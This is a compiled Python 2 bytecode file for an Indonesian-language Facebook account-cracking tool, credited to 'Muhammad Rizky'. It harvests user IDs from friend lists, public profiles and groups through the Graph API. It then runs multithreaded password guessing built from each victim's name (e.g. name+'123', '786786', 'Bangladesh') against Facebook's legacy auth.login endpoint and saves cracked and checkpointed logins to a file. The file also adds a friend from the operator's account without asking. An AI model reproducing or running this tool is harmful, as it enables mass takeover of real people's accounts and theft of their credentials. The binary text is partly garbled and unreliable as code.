ó
BZ^c           @   sû  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d g e _ d
   Z d   Z d   Z d   Z e d  e d  e d  d Z d   Z  d Z! g  Z" g  Z# g  a$ g  a% g  Z& g  Z' d Z( d Z) d   Z* d   Z+ d   Z, d   Z- d   Z. d   Z/ e0 d k r÷e*   n  d S(   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;96m[!] [1;91mExit(   t   ost   syst   exit(    (    (    s   0.pyt   keluar   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   0.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   0.pyR       s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   0.pyt   jalan*   s    s6   [1;96m    +++++++ JANGAN LUPA BUAT AKUN BARU +++++++ s;   [1;92m  +++++++ UNTUK MENGHINDARI SESI/CHECKPOINT +++++++ s4   [1;93m    +++++++ RECODE BY MUHAMMAD RIZKY +++++++ sK   [1;96m
â­ââ®â­ââ³âââ®â­ââââ®â­ââââ³ââââ³ââââ® 
âââ°â¯âââ­â®âââ­âââ¯ââ­ââ®ââ­ââ®ââ­ââ®â 
ââ­â®â­â®ââ°â¯â°â«â°âââ®ââ°ââ¯ââ°ââ¯âââ±ââ 
[1;92mâââââââ­ââ®ââ­âââ¯ââ­âââ«â­â®â­â«ââ±ââ 
âââââââ°ââ¯âââ±â±â±âââ±â±ââââ°â«â°ââ¯â 
â°â¯â°â¯â°â»ââââ»â¯â±â±â±â°â¯â±â±â°â¯â°ââ»ââââ¯ 
[1;93mâ«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«
[1;97mâ¢ GITHUB    : Github.com/RKT1/pro
â¢ FACEBOOK  : Fb.com/Rizky.Rasata
â¢ WHATSAPP  : 0895600575323
[1;94mâ«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«â«
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s)   [1;92m[â] [1;96mSedang masuk [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   0.pyt   tik@   s
      i    s   [31mNot Vulns	   [32mVulnc          C   sÔ  t  j d  y t d d  }  t   Wn¦t t f k
 rÏt  j d  t GHd d GHd d GHd d GHd GHt d  } t d	  } t   y t	 j d
  Wn  t
 j k
 rÁ d GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rqy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d  6| d 6d! d" 6d# d$ 6} t j d%  } | j |  | j   } | j i | d& 6 d' } t j | d( | } t j | j  }	 t d d)  }
 |
 j |	 d*  |
 j   d+ GHt j d, |	 d*  t  j d-  t   Wqqt j  j! k
 rmd GHt   qqXn  d. | k r¦d/ GHt  j d0  t" j# d  t   qÐd1 GHt  j d0  t" j# d  t$   n Xd  S(2   Nt   clears	   login.txtt   ri   sm   [1;91mâ¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢â¢s&   [1;97m   NOTE : WAJIB PAKAI AKUN BARUs9   [1;92m[â] [1;96mLOGIN AKUN FACEBOOK ANDA [1;92m[â]s+   [1;92m[+] [1;96mID/Email [1;91m: [1;92ms+   [1;92m[+] [1;96mPassword [1;91m: [1;92ms   https://mbasic.facebook.coms$   
[1;96m[!] [1;91mTidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens#   
[1;92m[â] [1;92mLogin BerhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s,   xdg-open https://m.facebook.com/Rizky.Rasatat
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints   rm -rf login.txts'   
[1;96m[!] [1;91mPassword/Email salah(%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputR#   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR9   t   dataR   t   aR%   R   t   unikers(    (    s   0.pyRZ   P   sn    			
S

c          C   sY  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d GHt  j d  t j d  t   n# t j j k
 rd
 GHt   n Xt  j d  t GHd | d GHd | d GHd GHd GHd GHt   d  S(   NR$   s	   login.txtR%   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameR\   s#   [1;96m[!] [1;91mTidak ada koneksis)   [1;93m[â] [1;97mNama [1;91m: [1;92ms   [1;97m                  s)   [1;93m[â] [1;97mID   [1;91m: [1;92ms   [1;97m              t    s"   [1;97m1.[1;96m Hack facebook MBFs$   
[1;91m0.[1;91m Logout            Rc   (   R   R=   R>   t   readRA   R   R   R   RR   RS   RT   RU   RV   R@   RZ   RY   R   RB   t   pilih(   R[   t   otwR`   t   namaR\   (    (    s   0.pyR?      s>    

c          C   s   t  d  }  |  d k r' d GHt   n\ |  d k r= t   nF |  d k rw t j d  t d  t j d  t   n d GHt   d  S(	   Ns   
[1;97m >>> [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR/   R5   R$   s   Menghapus tokens   rm -rf login.txt(   RC   Re   t   superR   R=   R    R   (   Ra   (    (    s   0.pyRe   ­   s    



c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHt
   d  S(
   NR$   s	   login.txtR%   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s(   [1;97m1.[1;96m Crack dari daftar temans%   [1;97m2.[1;96m Crack dari id publiks   
[1;91m0.[1;91m Kembali(   R   R=   R>   Rd   R[   RA   R   R   R   RB   t   pilih_super(    (    (    s   0.pyRh   ¾   s    c          C   s(  t  d  }  |  d k r' d GHt   n|  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } xÃ| d D] } t j | d	  q Wn|  d
 k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r.d GHt  d  t   n Xt d  t j d | d t  } t	 j
 | j  } xÑ| d D] } t j | d	  qqWn«|  d k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 r d GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xß | d D] } t j | d	  qcWn¹ |  d k rt j d  t GHd d GHyC t  d  } x0 t | d  j   D] } t j | j    qÍWWq:t k
 rd  GHt  d!  t   q:Xn" |  d" k r.t   n d GHt   d# t t t   GHd$ d% d& g } x0 | D]( } d' | Gt j j   t j d(  qeWHd) GHd( d* GHd( d+ GHd( d, GHd( d* GHd-   } t d.  } | j | t  d/ GHd0 t t t   d1 t t t   GHd2 GHt  d3  t    d  S(4   Ns   
[1;97m >>> [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR/   R$   s+   [1;97m[âº] [1;96mMengambil ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=R_   R\   t   2s4   [1;97m[+] [1;96mMasukan ID publik [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s0   [1;97m[â] [1;96mNama Publik[1;91m :[1;97m Rb   s,   [1;96m[!] [1;91mID publik tidak ditemukan!s   
[1;96m[[1;97mKembali[1;96m]s   /friends?access_token=t   3s3   [1;96m[+] [1;93mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;96m[[1;97mâ[1;96m] [1;93mNama group [1;91m:[1;97m s'   [1;96m[!] [1;91mGroup tidak ditemukans+   [1;96m[âº] [1;93mMengambil ID [1;97m...s5   /members?fields=name,id&limit=999999999&access_token=t   4i*   s   [1;96m=s5   [1;96m[+] [1;93mMasukan nama file  [1;91m: [1;97mR%   s&   [1;96m[!] [1;91mFile tidak ditemukans!   
[1;96m[ [1;97mKembali [1;96m]R5   s+   [1;97m[+] [1;96mTotal ID [1;91m: [1;97ms   .   s   ..  s   ... s+   [1;97m[â¸][1;96m Crack Berjalan [1;97mi   s   [1;97m[!] [1;96mStop CTRL+Zsu   [1;91mâ ï¸ ââââââââââââââââââââââââââââââââ â ï¸s+   [1;92m JIKA DALAM 5 MENIT BELUM ADA HASIL s!       GUNAKAN MODE PESAWAT 5 DETIK c         S   sü  |  } y t  j d  Wn t k
 r* n XyÃt j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rÒ d
 GHd | GHd | d GHt j | |  nd | d k rGd GHd | GHd | d GHt d d  } | j d | d | d  | j   t j | |  n¦| d d } t	 j
 d | d | d  } t j |  } d	 | k r¾d
 GHd | GHd | d GHt j | |  n/d | d k r@d GHd | d GHd | GHd | d GHt d d  } | j d | d | d  | j   t j | |  n­| d d }	 t	 j
 d | d |	 d  } t j |  } d	 | k rÄd
 GHd | d GHd | GHd |	 d GHt j | |	  n)d | d k r9d GHd | GHd |	 d GHt d d  } | j d | d |	 d  | j   t j | |	  n´d }
 t	 j
 d | d |
 d  } t j |  } d	 | k r¨d
 GHd | GHd |
 d GHt j | |
  nEd | d k rd GHd | GHd |
 d GHt d d  } | j d | d |
 d  | j   t j | |
  nÐ| d d } t	 j
 d | d | d  } t j |  } d	 | k rd
 GHd | GHd | d GHt j | |  nYd | d k r	d GHd | GHd | d GHt d d  } | j d | d | d  | j   t j | |  nä d } t	 j
 d | d | d  } t j |  } d	 | k rxd
 GHd | GHd | d GHt j | |  nu d | d k ríd GHd | GHd | d GHt d d  } | j d | d | d  | j   t j | |  n  Wn n Xd  S(    Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R;   s   [1;96m[â] [1;92mOKs-   [1;96m[â¹] [1;97mID [1;91m      : [1;92ms-   [1;96m[â¹] [1;97mPassword [1;91m: [1;92ms   
s   www.facebook.comt	   error_msgs   [1;96m[â] [1;93mCPs-   [1;96m[â¹] [1;97mID [1;91m      : [1;93ms-   [1;96m[â¹] [1;97mPassword [1;91m: [1;93ms   out/one.txtR`   s   ID:s    Pw:t   1234s   [1;96m[â] [1;93mCEKPOINTs-   [1;96m[âº] [1;97mNama [1;91m    : [1;93mRb   t	   last_names-   [1;96m[âº] [1;97mNama [1;91m    : [1;92mt   786786t   12345t
   Bangladesh(   R   t   mkdirt   OSErrorRR   RS   R[   RT   RU   RV   t   urllibt   urlopent   loadt   okst   appendR>   R   RW   t   cekpoint(   t   argt   userR`   t   bt   pass1R_   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6(    (    s   0.pyt   main  sØ    		
		
		
		
		
		
i   s5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93ms?   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/one.txts7   
[1;96m[[1;97m Keluar & ketik python2 pro.py [1;96m](!   RC   Ri   R   R=   RB   R    RR   RS   R[   RT   RU   RV   R\   R|   R@   Rh   R>   t	   readlinest   stripRA   R?   R   R   R   R   R   R   R   R    t   mapR{   R}   R   (   t   peakR%   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR!   R"   R   (    (    s   0.pyRi   Ï   s¤    





	

  					z)
c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xt  j d  t
 GHd d	 GHyÞ t j d
 |   } t j | j  } xz | d D]n } | d } | d } t d d  } t j |  | j | d  d GHd t |  GHd t |  d GHqÓ Wd d	 GHd t t  GHd GH| j   t d  t   Wn t t f k
 r­d GHt d  t   no t k
 rÓd GHt d  t   nI t j j k
 rõd GHt   n' t k
 rd GHt d  t   n Xd  S(   NR$   s	   login.txtR%   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rm   i*   s   [1;96m=s2   https://graph.facebook.com/me/groups?access_token=R_   Rb   R\   s   out/Grupid.txtR   s   
s   [1;96m[â] [1;92mGROUP SAYAs(   [1;96m[â¹] [1;97mID  [1;91m: [1;92ms(   [1;96m[â¹] [1;97mNama[1;91m: [1;92ms0   [1;96m[+] [1;92mTotal Group [1;91m:[1;97m %ss:   [1;96m[+] [1;92mTersimpan [1;91m: [1;97mout/Grupid.txts   
[1;96m[[1;97mKembali[1;96m]s   [1;96m[!] [1;91mTerhentis'   [1;96m[!] [1;91mGroup tidak ditemukans%   [1;96m[â] [1;91mTidak ada koneksis   [1;96m[!] [1;91mError(   R   R=   R>   Rd   RA   R   R   R   Rv   Rw   RB   RR   RS   RT   RU   RV   t   listgrupR|   R   R   R   RW   RC   R?   t   KeyboardInterruptt   EOFErrorR@   RY   R   (   R[   t   uht   gudR   Rg   R\   t   f(    (    s   0.pyt   grupsaya  s`    	

	







t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(1   R   R   R   t   datetimeR   RN   R   t	   threadingRT   Rx   t	   cookielibRR   RE   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRD   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    RB   R#   t   backt   threadst   berhasilR}   R{   R\   R   t   vulnott   vulnRZ   R?   Re   Rh   Ri   R   t   __name__(    (    (    s   0.pyt   <module>   sF   
			
	


		;	"			Ð	6